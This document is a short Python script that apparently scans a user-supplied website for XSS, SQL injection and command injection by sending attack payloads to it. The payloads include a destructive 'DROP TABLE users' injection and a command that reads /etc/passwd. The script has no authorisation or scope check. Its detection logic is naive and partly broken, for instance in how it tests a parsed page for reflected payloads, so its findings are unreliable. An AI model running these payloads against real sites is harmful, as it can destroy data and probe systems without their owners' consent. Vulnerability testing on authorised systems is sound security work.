import requests
from bs4 import BeautifulSoup

def check_xss_vulnerability(url):
    print("Checking for Cross-Site Scripting (XSS) vulnerability...")
    payloads = ['<script>alert("XSS")</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                # Add more XSS payloads here...
               ]

    for payload in payloads:
        target_url = f"{url}/{payload}"
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        if payload in soup:
            print(f"[+] XSS Vulnerability Found: {target_url}")
        else:
            print(f"[-] Not Vulnerable to XSS: {target_url}")

def check_sql_injection_vulnerability(url):
    print("Checking for SQL Injection vulnerability...")
    payloads = ["' OR 1=1 --", "'; DROP TABLE users; --",  # Add more SQL injection payloads here...
               ]

    for payload in payloads:
        target_url = f"{url}/?id={payload}"
        response = requests.get(target_url)

        if "error" in response.text.lower():
            print(f"[+] SQL Injection Vulnerability Found: {target_url}")
        else:
            print(f"[-] Not Vulnerable to SQL Injection: {target_url}")

def check_command_injection_vulnerability(url):
    print("Checking for Command Injection vulnerability...")
    payloads = ["; ls", "&& cat /etc/passwd",  # Add more command injection payloads here...
               ]

    for payload in payloads:
        target_url = f"{url}/?param={payload}"
        response = requests.get(target_url)

        if "root" in response.text.lower():  # Look for potential privileged commands in the response
            print(f"[+] Command Injection Vulnerability Found: {target_url}")
        else:
            print(f"[-] Not Vulnerable to Command Injection: {target_url}")

if __name__ == "__main__":
  target_url = input("Enter the website URL: ")
  check_xss_vulnerability(target_url)
  check_sql_injection_vulnerability(target_url)
  check_command_injection_vulnerability(target_url)